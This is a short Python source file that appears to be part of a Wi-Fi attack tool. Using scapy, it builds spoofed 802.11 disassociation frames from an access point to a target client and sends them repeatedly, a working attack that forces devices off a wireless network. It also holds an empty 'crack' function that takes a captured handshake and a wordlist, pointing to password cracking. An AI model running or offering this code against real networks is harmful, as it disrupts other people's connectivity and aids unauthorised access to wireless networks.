from NetworkController import NetworkController
from scapy.all import *

def deauth(target, access_point, packet_count=10):
    interface = NetworkController().interface
    packet = RadioTap()/Dot11(type=0, subtype=10, addr1=target, addr2=access_point, addr3=access_point)/Dot11Disas(reason=3)

    for _ in range(packet_count):
        sendp(packet, iface=interface)

def crack(handshake, wordlist):
    pass